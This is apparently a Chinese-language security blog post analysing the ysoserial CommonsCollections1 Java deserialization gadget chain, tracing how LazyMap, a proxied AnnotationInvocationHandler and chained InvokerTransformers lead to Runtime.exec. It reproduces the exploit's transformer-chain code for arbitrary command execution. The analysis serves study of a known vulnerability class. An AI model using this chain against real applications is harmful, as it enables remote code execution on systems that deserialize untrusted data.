---
title: ysoserial-CommonCollections1
categories:
 - ysoserial
tags:
- ysoserial
- 反序列化

---

ysoserial-CommonCollections1利用链分析

# 环境

`jdk 1.7`

`Commons Collections 3.1`

# 利用链分析

CommonsCollections1类描述

```
/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
```

## Way to LazyMap

ysoserial中使用的LazyMap和TransformedMap的区别是TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 factory.transform，因此我们要找到一条到LazyMap.get()的链

![image-20210417220658515](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210417220658515.png)

在AnnotationInvocationHandler.invoke()中调用了get()，这里invoke()又可以通过对象代理来调用。AnnotationInvocationHandler是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到 invoke 方法中，进而触发我们的LazyMap.get()  

在ysoserial实现的方法如下

```java
final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
```

## LazyMap

这里分析一下LazyMap.get()的作用

`final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);`

```java
public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}
```

```Java
public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
```

这里的get中的this.factory.transform(key)实际上就调用了transformerChain.transform(key)，这个key为什么不影响，重要的是进入ChainedTransformer.transform()下面分别分析下几个重要的类的作用。

## ChainedTransformer

```java
public ChainedTransformer(Transformer[] transformers) {
    this.iTransformers = transformers;
}

public Object transform(Object object) {
    for(int i = 0; i < this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }

    return object;
}
```

ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。在transform方法中前⼀个回调返回的结果，作为后⼀个回调的参数传⼊

在调试的调用栈中，我们可以看到this.iTransformers中有一下几个类，所以接下来分析一下ConstantTransformer和InvokerTransformer

![image-20210417223322451](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210417223322451.png)

## ConstantTransformer

```java
    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }
```

ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回 ，前面提到key不影响的原因就是这个input不影响返回对象。

## InvokerTransformer

InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键。

在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表 

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    this.iMethodName = methodName;
    this.iParamTypes = paramTypes;
    this.iArgs = args;
}

public Object transform(Object input) {
    if (input == null) {
        return null;
    } else {
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        } catch (NoSuchMethodException var5) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException var6) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException var7) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
        }
    }
}
```
## 命令执行

我们来看看这段代码是如何执行命令的

```java
final Transformer transformerChain = new ChainedTransformer(
    new Transformer[]{ new ConstantTransformer(1) });
// real chain for after setup
final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {
            String.class, Class[].class }, new Object[] {
            "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer("exec",
            new Class[] { String.class }, execArgs),
        new ConstantTransformer(1) };
```

```
1.Runtime.class是第一个元素对象调用transform方法的返回值
2.(Runtime.class).getMethod("getRuntime",null)的结果是第二个元素对象调用transform方法的返回值
3.((Runtime.class).getMethod("getRuntime",null)).invoke(null,null)的结果是第三个元素对象调用transform方法的返回值
4.(((Runtime.class).getMethod("getRuntime",null)).invoke(null,null)).exec(execArgs)的结果是第四个元素对象调用transform方法的返回值。这个结果就是执行了execArgs。
5.ConstantTransformer(1)按照P神的说法是隐藏异常日志中的一些信息
```

## 小结

这篇文章因为从正向分析，不利于理解，适合已经了解该利用链基本原理的读者对利用链进行一个梳理。ysoserial中的CommonCollections1实现巧妙的用到了对象代理来调用invoke。之前在有的文章中看到在高版本的jdk中无法调用cc1是因为AnnotationInvocationHandler中的setValue方法被取消了，但是LazyMap从另一条利用链调用了transform依旧在高版本的jdk中失效了，在后续的文章中将其进行进一步的分析。

# 参考

[1] [Java安全漫谈-反序列化篇(3)~(5)](https://govuln.com/docs/java-things/)

[2] [Java反序列化（三）Common Collection 1分析](https://blog.csdn.net/qq_41918771/article/details/115242949)